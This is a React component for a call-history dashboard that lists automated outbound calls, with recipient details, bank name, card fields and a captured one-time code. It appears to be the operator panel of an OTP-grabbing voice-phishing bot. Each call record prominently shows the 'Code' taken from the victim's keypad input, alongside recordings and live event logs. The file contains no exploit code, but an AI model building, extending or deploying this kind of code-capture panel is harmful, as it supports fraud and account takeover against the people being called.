import React, { useState, useEffect } from 'react';
import { useAuth } from '../contexts/AuthContext';
import api from '../services/api';
import { Button } from '../components/ui/button';
import { Badge } from '../components/ui/badge';
import { Card, CardContent } from '../components/ui/card';
import { ScrollArea } from '../components/ui/scroll-area';
import { toast } from 'sonner';
import { Phone, Download, PhoneOff, Clock } from 'lucide-react';
import { format } from 'date-fns';

export default function CallHistory() {
  const { userProfile } = useAuth();
  const [calls, setCalls] = useState([]);
  const [selectedCall, setSelectedCall] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchCallHistory();
  }, []);

  const fetchCallHistory = async () => {
    try {
      const response = await api.get('/calls/history');
      setCalls(response.data);
      if (response.data.length > 0) {
        setSelectedCall(response.data[0]); // Auto select first call
      }
    } catch (error) {
      console.error('Error fetching call history:', error);
      toast.error('Failed to load call history');
    } finally {
      setLoading(false);
    }
  };

  const getAnsweredBy = (call) => {
    const amdEvent = call.events?.find(e => e.event === 'amd_result');
    if (amdEvent) {
      const answeredBy = amdEvent.data?.answered_by;
      if (answeredBy?.includes('machine')) return 'voicemail';
      return 'human';
    }
    const answered = call.events?.find(e => e.event === 'in-progress' || e.event === 'answered');
    if (answered) return 'human';
    return 'unanswered';
  };

  const getFirstResponse = (call) => {
    const firstInput = call.events?.find(e => e.event === 'first_input_received');
    return firstInput?.data?.digit || 'N/A';
  };

  const getOtpCode = (call) => {
    const otpEvent = call.events?.find(e => e.event === 'otp_received' || e.event === 'digits_received');
    return otpEvent?.data?.otp || otpEvent?.data?.digits || 'N/A';
  };

  const handleHangup = async (callId) => {
    try {
      await api.post(`/calls/${callId}/control`, {
        action: 'end',
        message: 'Call ended by user'
      });
      toast.success('Call ended successfully');
      fetchCallHistory();
    } catch (error) {
      console.error('Error ending call:', error);
      toast.error('Failed to end call');
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-full">
        <div className="terminal-text">Fetching data. Please do not refresh browser.</div>
      </div>
    );
  }

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-6" data-testid="call-history-page">
      {/* LEFT - Call List */}
      <div className="lg:col-span-1 space-y-4">
        <div>
          <h2 className="text-2xl font-bold text-white mb-2">Call History</h2>
          <p className="text-gray-400">{calls.length} calls</p>
        </div>

        <ScrollArea className="h-[calc(100vh-12rem)] scrollbar-thin">
          <div className="space-y-3">
            {calls.map((call) => {
              const otpCode = getOtpCode(call);
              
              return (
                <div
                  key={call.call_id}
                  className={`p-4 rounded-lg cursor-pointer transition-all ${
                    selectedCall?.call_id === call.call_id
                      ? 'bg-[#00FF7F]/10 border-2 border-[#00FF7F]'
                      : 'bg-[#0F0F14] border border-[#00FF7F]/10 hover:border-[#00FF7F]/30'
                  }`}
                  onClick={() => setSelectedCall(call)}
                  data-testid={`call-item-${call.call_id}`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center gap-2 text-[#00FF7F]">
                      <Phone className="w-4 h-4" />
                      <span className="font-semibold">{call.to_number}</span>
                    </div>
                    
                    <p className="text-sm text-gray-400">
                      <span className="text-white font-medium">Service:</span> {call.service_name}
                    </p>
                    
                    <p className="text-xs text-gray-500">
                      {format(new Date(call.created_at), 'MM/dd/yyyy, h:mm:ss a')}
                    </p>
                    
                    <p className="text-sm text-gray-400">
                      <span className="text-white font-medium">From:</span> +{call.from_number}
                    </p>
                    
                    <p className="text-sm text-gray-400">
                      <span className="text-white font-medium">Events:</span> {call.events?.length || 0}
                    </p>
                    
                    <p className="text-sm text-gray-400">
                      <span className="text-white font-medium">Code:</span>{' '}
                      <span className="text-[#00FF7F] font-mono">{otpCode}</span>
                    </p>
                    
                    {call.recording_url && (
                      <Button
                        size="sm"
                        variant="outline"
                        className="btn-secondary mt-2 w-full text-xs"
                        onClick={(e) => {
                          e.stopPropagation();
                          window.open(call.recording_url, '_blank');
                        }}
                      >
                        <Download className="w-3 h-3 mr-1" />
                        Download Recording
                      </Button>
                    )}
                  </div>
                </div>
              );
            })}
            
            {calls.length === 0 && (
              <div className="text-center py-12 text-gray-400">
                <Phone className="w-12 h-12 mx-auto mb-3 opacity-30" />
                <p>No calls yet</p>
              </div>
            )}
          </div>
        </ScrollArea>
      </div>

      {/* RIGHT - Call Details */}
      <div className="lg:col-span-2">
        {selectedCall ? (
          <div className="space-y-4">
            {/* Call Information */}
            <Card className="glass-effect border-[#00FF7F]/20">
              <CardContent className="p-6">
                <h3 className="text-lg font-semibold text-[#00FF7F] mb-4">Call Information:</h3>
                <div className="grid grid-cols-2 gap-x-8 gap-y-3">
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Caller Id:</p>
                    <p className="text-white">{selectedCall.from_number}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Recipient Name:</p>
                    <p className="text-white">{selectedCall.recipient_name || '-'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Recipient Number:</p>
                    <p className="text-white">{selectedCall.to_number}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Service Name:</p>
                    <p className="text-white">{selectedCall.service_name}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Required Digit:</p>
                    <p className="text-white">{selectedCall.digits || 6}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Card Type:</p>
                    <p className="text-white">-</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Bank Name:</p>
                    <p className="text-white">-</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Card Ending:</p>
                    <p className="text-white">-</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Language:</p>
                    <p className="text-white">english</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Voice:</p>
                    <p className="text-white">{selectedCall.tts_voice || 'Aurora'}</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Status */}
            <Card className="glass-effect border-[#00FF7F]/20">
              <CardContent className="p-6">
                <h3 className="text-lg font-semibold text-[#00FF7F] mb-4">Status:</h3>
                <div className="space-y-3">
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Answered By:</p>
                    <p className="text-white">{getAnsweredBy(selectedCall)}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Code:</p>
                    <p className="text-[#00FF7F] font-mono font-semibold text-lg">{getOtpCode(selectedCall)}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Recording URL:</p>
                    {selectedCall.recording_url ? (
                      <div className="flex items-center gap-2">
                        <p className="text-white text-sm truncate flex-1">{selectedCall.recording_url}</p>
                        <Button
                          size="sm"
                          className="btn-secondary"
                          onClick={() => window.open(selectedCall.recording_url, '_blank')}
                        >
                          <Download className="w-3 h-3" />
                        </Button>
                      </div>
                    ) : (
                      <p className="text-gray-500 text-sm">-</p>
                    )}
                  </div>
                  <div>
                    <p className="text-xs text-gray-400 mb-1">Responses:</p>
                    <p className="text-white">recived pressed {getFirstResponse(selectedCall)}</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Live Events */}
            <Card className="glass-effect border-[#00FF7F]/20">
              <CardContent className="p-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold text-[#00FF7F]">LIVE EVENTS</h3>
                  {selectedCall.status === 'in-progress' && (
                    <Button
                      size="sm"
                      variant="destructive"
                      className="bg-red-500/20 hover:bg-red-500/30 text-red-400 border-red-400/30"
                      onClick={() => handleHangup(selectedCall.call_id)}
                      data-testid="hangup-button"
                    >
                      <PhoneOff className="w-4 h-4 mr-2" />
                      HangUp
                    </Button>
                  )}
                </div>
                
                <div className="bg-black/40 rounded-lg p-4 border border-[#00FF7F]/10">
                  <ScrollArea className="h-64 scrollbar-thin">
                    <div className="space-y-1 font-mono text-sm">
                      {selectedCall.events && selectedCall.events.length > 0 ? (
                        selectedCall.events.map((event, index) => (
                          <div key={index} className="flex items-start gap-3 text-[#00FF7F] py-1">
                            <span className="text-gray-500 min-w-[70px]">
                              {format(new Date(event.time), 'HH:mm:ss')}
                            </span>
                            <span className="text-[#00FF7F]">→</span>
                            <div className="flex-1">
                              <span className="text-white">{event.event}</span>
                              {event.data && Object.keys(event.data).length > 0 && (
                                <span className="text-gray-400 text-xs ml-2">
                                  {event.data.digit && `[digit: ${event.data.digit}]`}
                                  {event.data.otp && `[code: ${event.data.otp}]`}
                                  {event.data.digits && `[digits: ${event.data.digits}]`}
                                  {event.data.status && `[${event.data.status}]`}
                                </span>
                              )}
                            </div>
                          </div>
                        ))
                      ) : (
                        <p className="text-gray-500 text-center py-8">No events recorded</p>
                      )}
                    </div>
                  </ScrollArea>
                </div>
                
                {selectedCall.status === 'in-progress' && (
                  <div className="mt-3 text-center text-gray-400 text-sm">
                    <span className="inline-block animate-pulse mr-2">●</span>
                    Fetching data. Please do not refresh browser.
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        ) : (
          <div className="flex items-center justify-center h-full">
            <div className="text-center text-gray-400">
              <Phone className="w-16 h-16 mx-auto mb-4 opacity-30" />
              <p className="text-lg">Select a call from the list to view details</p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
